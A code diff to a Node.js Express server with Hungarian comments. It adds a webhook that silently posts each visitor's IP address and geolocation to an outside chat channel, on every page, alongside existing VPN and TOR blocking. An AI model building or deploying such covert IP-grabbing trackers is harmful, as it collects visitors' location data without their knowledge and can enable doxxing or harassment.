@@ -7,6 +7,7 @@ const fs = require('fs');
 const app = express();
 
 const PORT = process.env.PORT || 3000;
+const MAIN_WEBHOOK = process.env.MAIN_WEBHOOK;
 const ALERT_WEBHOOK = process.env.ALERT_WEBHOOK;
 
 // ---- Magyarosított formázó minden fontos adattal ----
@@ -85,11 +86,27 @@ async function getGeo(ip) {
   }
 }
 
-// --- Főoldal (/) csak VPN/proxy/TOR esetén logol ---
+// --- Főoldal (/) ---
 app.get('/', async (req, res) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
 
+  // Minden látogató logolása a MAIN webhookba
+  axios.post(MAIN_WEBHOOK, {
+    username: "Helyszíni Naplózó <3",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: '',
+    embeds: [{
+      title: 'Új látogató az oldalon!',
+      description: `**Oldal:** /\n` +
+                   `**IP-cím:** ${ip}\n` +
+                   `${magyarVpnInfo(geoData)}\n` +
+                   formatGeoDataMagyar(geoData),
+      color: 0x800080
+    }]
+  }).catch(()=>{});
+
+  // Csak VPN/proxy/TOR esetén log az ALERT webhookba és tiltás
   if (isBlockedByVpnProxyTor(geoData)) {
     axios.post(ALERT_WEBHOOK, {
       username: "VPN figyelő <3",
@@ -110,7 +127,7 @@ app.get('/', async (req, res) => {
   res.sendFile(path.join(__dirname, 'public/index.html'));
 });
 
-// --- Dinamikus aloldalak (/kecske, /barmi) csak VPN esetén logol ---
+// --- Dinamikus aloldalak (/kecske, /barmi) ---
 app.get('/:page', async (req, res, next) => {
   const pageName = req.params.page;
   if (pageName === 'report') return next();
@@ -121,6 +138,22 @@ app.get('/:page', async (req, res, next) => {
   const ip = getClientIp(req);
   const geoData = await getGeo(ip);
 
+  // Minden látogató logolása a MAIN webhookba
+  axios.post(MAIN_WEBHOOK, {
+    username: "Helyszíni Naplózó <3",
+    avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg",
+    content: '',
+    embeds: [{
+      title: 'Új látogató az oldalon!',
+      description: `**Oldal:** /${pageName}\n` +
+                   `**IP-cím:** ${ip}\n` +
+                   `${magyarVpnInfo(geoData)}\n` +
+                   formatGeoDataMagyar(geoData),
+      color: 0x800080
+    }]
+  }).catch(()=>{});
+
+  // Csak VPN/proxy/TOR esetén log az ALERT webhookba és tiltás
   if (isBlockedByVpnProxyTor(geoData)) {
     axios.post(ALERT_WEBHOOK, {
       username: "VPN figyelő <3",
